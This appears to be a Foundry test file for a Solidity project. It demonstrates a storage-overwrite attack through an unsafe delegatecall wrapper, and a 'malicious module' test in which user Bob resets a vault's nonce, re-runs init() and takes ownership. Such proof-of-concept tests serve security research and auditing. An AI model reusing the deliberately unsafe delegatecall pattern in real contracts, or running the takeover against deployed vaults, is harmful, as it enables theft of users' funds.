// SPDX-License-Identifier: Unlicense
pragma solidity 0.8.13;

import "forge-std/Test.sol";
import "../src/targets/Malicious.sol";
import "./MaliciousTestUtil.sol";

contract Unwise {

  uint256 public blah;
  address public test;

  function callUnwisely(address target, bytes calldata data) public {
    uint256 stipend = gasleft() - 5000;
    (bool success,) = target.delegatecall{gas: stipend}(data);
    require(success);
  }

}

contract MaliciousTest is MaliciousTestUtil {

    Unwise unwise;
    Malicious malicious;

    /// =================
    /// ===== SETUP =====
    /// =================
    function setUp() public {
      malicious = new Malicious();
      unwise = new Unwise();

      setUpContract();
      alice = setUpUser(111, 1);
      bob = setUpUser(222, 2);

      vm.label(address(this), "MaliciousTest");
      vm.label(alice.addr, "Alice");
      vm.label(bob.addr, "Bob");
    }

    function testMalicious() public {
      bytes memory data = abi.encodeCall(malicious.setIndex, (0, bytes32(uint256(42))));
      assertEq(unwise.blah(), 0);
      unwise.callUnwisely(address(malicious), data);
      assertEq(unwise.blah(), 42);


      data = abi.encodeCall(malicious.setIndex, (1, bytes32(uint256(0xcafebabe))));
      assertEq(unwise.test(), address(0));
      unwise.callUnwisely(address(malicious), data);
      assertEq(unwise.test(), address(uint160(0xcafebabe)));
    }


    function testMaliciousModule() public {
      initializeMalicious(alice);

      vm.startPrank(bob.addr); // Let's be Bob

      // set the nonce back to 0
      maliciousModule.setIndex(vault, 2, bytes32(uint256(0)), setIndexProof);

      // When nonce = 0 this allows anyone to call init() and become the owner
      IVault(vault).init();

      vm.stopPrank();

      // Bob is now the owner of the vault!
      assertEq(IVault(vault).owner(), bob.addr);


    }




}
